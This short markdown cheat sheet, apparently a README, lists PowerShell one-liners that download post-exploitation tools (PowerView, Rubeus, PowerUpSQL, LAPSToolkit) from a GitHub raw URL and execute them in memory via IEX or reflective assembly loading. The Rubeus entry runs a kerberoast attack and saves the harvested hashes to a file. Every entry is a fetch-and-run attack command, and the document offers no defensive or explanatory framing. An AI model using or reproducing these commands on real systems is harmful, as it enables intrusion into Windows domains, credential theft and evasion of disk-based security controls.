# Reflective loading tools

PowerView
```powershell
(new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/wez3/reflective-loading/main/PowerView.ps1') | IEX
```

Rubeus
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('https://raw.githubusercontent.com/wez3/reflective-loading/main/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("kerberoast /outfile:C:\temp\hashes.txt".Split())
```
PowerUpSQL
```powershell
(new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/wez3/reflective-loading/main/PowerUpSQL.ps1') | IEX
```

LAPSToolkit
```powershell
(new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/wez3/reflective-loading/main/LAPSToolkit.ps1') | IEX
```
